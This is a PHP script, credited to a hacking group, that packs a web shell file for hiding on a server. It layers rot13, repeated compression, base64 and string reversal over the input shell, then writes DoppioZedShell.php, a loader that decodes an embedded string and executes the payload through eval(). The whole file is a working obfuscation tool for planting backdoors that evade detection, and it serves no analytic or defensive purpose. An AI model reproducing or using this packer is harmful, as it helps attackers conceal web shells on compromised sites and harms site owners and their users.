<?php
/*
home => https://www.facebook.com/groups/hackteach.org/
*/
		error_reporting(0);
		@set_time_limit(0);
		print "______                  _       _____ _          _ _ 
|  _  \                (_)     /  ___| |        | | |
| | | |___  _ __  _ __  _  ___ \ `--.| |__   ___| | |
| | | / _ \| '_ \| '_ \| |/ _ \ `--. \ '_ \ / _ \ | |
| |/ / (_) | |_) | |_) | | (_) /\__/ / | | |  __/ | |
|___/ \___/| .__/| .__/|_|\___/\____/|_| |_|\___|_|_|
           | |   | |                                 
           |_|   |_|                                 

";
									print '
		[>]-------------------------------------------[<]
		[>] Coded By    :        DoppioZed          [<]
		[>] Group    :        Hack Teach  team      [<]
		[>] home    :      fb.com/hackteach.org     [<]
		[>]-------------------------------------------[<]						
		';
					echo "Usage : php {$argv[0]} shell.txt\n\n\t";
					
					if (!file_exists($argv[1])) 
									die("$argv[1] n'existe pas !!!!!!!!!!!\n");
				
					$shell = $argv[1];     
					$DoppioZedEncode = file_get_contents($shell);
					$DoppioZedShell= strrev(base64_encode(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(str_rot13($DoppioZedEncode)))))))))));
						$fp=fopen('DoppioZedShell.php','w');
									fwrite($fp, '<?php		
									$DoppioZedSecrets1 = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
									$An0n_3xPloiTeR = "'.$DoppioZedShell.'";
									eval(htmlspecialchars_decode(gzinflate(base64_decode($DoppioZedSecrets1))));
									exit;
									?> ');
											fclose($fp);
								
								
							echo "Done => shell name DoppioZedShell.php \n";

?>
